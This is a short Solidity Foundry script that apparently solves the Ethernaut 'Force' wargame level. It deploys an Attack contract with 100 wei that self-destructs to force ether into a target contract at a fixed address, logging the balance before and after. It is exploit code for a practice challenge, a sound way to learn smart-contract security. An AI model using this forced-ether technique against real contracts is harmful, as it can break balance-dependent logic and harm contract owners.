// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Force} from "../src/Force.sol";

contract ForceSolve is Script {
    Force public force = Force(0xef1ec80b578969a99B840745178d655f3594Db99);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("balance of Force : ", address(force).balance);
        new Attack{value: 100 wei}().exploit(payable(address(force)));
        console.log("balance of Force : ", address(force).balance);
        vm.stopBroadcast();
    }
}

contract Attack{
    address public owner;
    constructor() payable {
        owner = msg.sender;
    }
    function exploit(address payable _fundReceiver) public {
        require(msg.sender == owner);
        selfdestruct(_fundReceiver);
    }

}